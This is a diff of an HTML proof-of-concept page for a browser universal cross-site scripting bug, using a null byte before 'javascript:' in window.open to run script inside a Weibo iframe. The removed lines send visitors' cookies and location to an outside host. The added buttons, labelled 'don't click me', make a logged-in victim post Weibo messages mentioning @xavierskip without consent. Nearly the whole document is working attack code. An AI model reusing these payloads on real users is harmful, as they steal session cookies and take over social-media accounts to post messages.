@@ -1,31 +1,18 @@
 <script type="text/javascript">
-function test(){
-xhr = new XMLHttpRequest();
-xhr.onreadystatechange = function (){
-if (xhr.readyState == 4) {
-alert('cross origin ok!',xhr.responseText);
-} };
-xhr.open('GET','http://hualbum.duapp.com/'+document.location);
-xhr.send(document.cookie);
+function weibocom(){
+var h=document.domain;if(h=='m.weibo.cn'){u='/mblogDeal/addAMblog?rl=1';c='content'};if(h=='www.weibo.com'){u='/aj/mblog/add?_wv=5&__rnd=1409792585330';c='text'}
+var xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){location='http://weibo.com');}};xhr.open('POST',u, true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send(c+'=@xavierskip 我就点了怎么滴!');
 }
-function woc(){
-alert(document.location+'/ncookie:/n'+document.cookie);
-}
-function faweibo(){
-var xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){alert('uxss!',xhr.responseText);}};xhr.open('POST','/aj/mblog/add?_wv=5&__rnd=1409792585330', true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('text=@xavierskip UXSS https://code.google.com/p/chromium/issues/detail?id=37383');
+function weibocn(){
+var xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){location='http://weibo.com');}};xhr.open('POST','/mblog/sendmblog?st=0d5f', true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('content=@xavierskip 我错了');
 }
 </script>
 
 <iframe name="t1" src="http://weibo.com"></iframe>
+<iframe name="t2" src="http://weibo.cn"></iframe>
 
-<input type=button value="new window" 
-onclick=window.open('http://xavierskip.com','t1') >
+<input type=button value="不要点我" 
+onclick=window.open('\x00javascript:var%20h%3Ddocument.domain%3Bif%28h%3D%3D%27m.weibo.cn%27%29%7Bu%3D%27/mblogDeal/addAMblog%3Frl%3D1%27%3Bc%3D%27content%27%7D%3Bif%28h%3D%3D%27http://www.weibo.com%27%29%7Bu%3D%27/aj/mblog/add%3F_wv%3D5%26__rnd%3D1409792585330%27%3Bc%3D%27text%27%7Dvar%20xhr%3Dnew%20XMLHttpRequest%28%29%3Bxhr.onreadystatechange%3Dfunction%28%29%7Bif%28xhr.readyState%3D%3D4%29%7Blocation%3D%27http%3A//weibo.com%27%29%3B%7D%7D%3Bxhr.open%28%27POST%27%2Cu%2C%20true%29%3Bxhr.setRequestHeader%28%27Content-type%27%2C%27application/x-www-form-urlencoded%27%29%3Bxhr.send%28c+%27%3D@xavierskip%20%u6211%u5C31%u70B9%u4E86%u600E%u4E48%u6EF4%21%27%29%3B','t1')>
 
-<input type=button value="new window cookie" 
-onclick=window.open('javascript:alert%28document.cookie%29','t1')>
-
-<input type=button value="BUG:new window cookie" 
-onclick=window.open('\x00javascript:alert%28document.cookie%29','t1')>
-
-<input type=button value="BUG:new window send cookie"
-onclick=window.open('\x00javascript:var%20xhr%3Dnew%20XMLHttpRequest%28%29%3Bxhr.onreadystatechange%3Dfunction%28%29%7Bif%28xhr.readyState%3D%3D4%29%7Balert%28%27uxss%21%27%2Cxhr.responseText%29%3B%7D%7D%3Bxhr.open%28%27POST%27%2C%27/aj/mblog/add%3F_wv%3D5%26__rnd%3D1409792585330%27%2C%20true%29%3Bxhr.setRequestHeader%28%27Content-type%27%2C%27application/x-www-form-urlencoded%27%29%3Bxhr.send%28%27text%3D@xavierskip%20UXSS%20https%3A//code.google.com/p/chromium/issues/detail%3Fid%3D37383%27%29%3B','t1')>
+<input type=button value="也不要点我"
+onclick=window.open('\x00javascript:var%20xhr%3Dnew%20XMLHttpRequest%28%29%3Bxhr.onreadystatechange%3Dfunction%28%29%7Bif%28xhr.readyState%3D%3D4%29%7Blocation%3D%27http%3A//weibo.com%27%29%3B%7D%7D%3Bxhr.open%28%27POST%27%2C%27/mblog/sendmblog%3Fst%3D0d5f%27%2C%20true%29%3Bxhr.setRequestHeader%28%27Content-type%27%2C%27application/x-www-form-urlencoded%27%29%3Bxhr.send%28%27content%3D@xavierskip%20%u6211%u9519%u4E86%27%29%3B','t1')>
